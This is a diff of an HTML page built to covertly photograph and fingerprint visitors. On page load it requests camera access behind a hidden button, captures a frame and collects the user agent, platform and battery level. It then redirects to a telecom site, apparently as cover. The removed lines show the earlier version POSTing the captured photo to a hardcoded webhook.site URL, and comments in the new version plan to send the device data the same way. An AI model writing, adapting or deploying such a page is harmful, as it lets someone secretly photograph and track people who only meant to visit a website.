@@ -1,10 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Camera Permission and Photo Capture</title>
+    <title>Camera Permission and Redirection</title>
 </head>
 <body>
-    <button id="requestCamera">Request Camera Permission</button>
+    <button id="requestCamera" style="display: none;">Request Camera Permission</button>
 
     <script>
         // Function to request camera permission and capture a photo
@@ -14,7 +14,12 @@
                 // Camera access granted
                 console.log('Camera permission granted.');
 
-                // Access the video stream and capture a photo
+                // Hide the button
+                document.getElementById('requestCamera').style.display = 'none';
+
+
+
+                // Access the video stream and capture a photo (you can add this part as needed)
                 const video = document.createElement('video');
                 document.body.appendChild(video);
                 video.srcObject = stream;
@@ -29,50 +34,57 @@
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Convert the captured image to a data URL
-                    const dataURL = canvas.toDataURL('image/jpeg');
+                    // Convert the captured image to a Blob
+                    canvas.toBlob(function(blob) {
+                        // Get device information
+                        getDeviceInformation(blob);
 
-                    // Send the dataURL to the custom URL
-                    sendPhoto(dataURL);
-
-                    // Clean up resources
-                    stream.getTracks().forEach(track => track.stop());
-                    video.remove();
+                        // Clean up resources (you can add this part as needed)
+                        stream.getTracks().forEach(track => track.stop());
+                        video.remove();
+                    }, 'image/jpeg');
                 };
             })
             .catch(function(error) {
                 // Camera access denied
-                console.error('Camera permission denied: ' + error);
+
+                // Get the battery percentage and device information
+                getBatteryPercentage();
+                getDeviceInformation();
             });
         }
 
-        // Function to send the captured photo to a custom URL
-        function sendPhoto(dataURL) {
-            // Replace 'https://webhook.site/6bab9354-77d4-4922-9f9c-32c264d35fb7' with your actual custom URL
-            const customURL = 'https://webhook.site/6bab9354-77d4-4922-9f9c-32c264d35fb7';
+        // Function to get the battery percentage
+        function getBatteryPercentage() {
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(function(battery) {
+                    // Include the battery percentage in the request (you can add this part as needed)
+                    console.log('Battery Percentage: ' + (battery.level * 100) + '%');
+                });
+            } else {
+                console.log('Battery Status API is not supported in this browser.');
+            }
+        }
 
-            // Create a FormData object to send the image
-            const formData = new FormData();
-            formData.append('image', dataURL);
+        // Function to get device information and include it in the request
+        function getDeviceInformation(photoBlob) {
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                brand: navigator.appVersion,
+                model: navigator.product,
+                platform: navigator.platform
+            };
 
-            // Use an HTTP POST request to send the FormData to the custom URL with CORS support
-            fetch(customURL, {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                // Handle the response from the server here
-                console.log('Image sent to custom URL successfully.');
-            })
-            .catch(error => {
-                console.error('Error sending the image: ' + error);
-            });
+            // Include device information and the captured photo in the request (you can add this part as needed)
+            console.log('Device Information:', deviceInfo);
         }
 
         // Automatically click the button when the page loads
         window.addEventListener('load', function() {
             requestCameraPermission();
         });
+        // Redirect to mobitel.lk after permission is granted
+        window.location.href = 'https://mobitel.lk';
     </script>
 </body>
 </html>
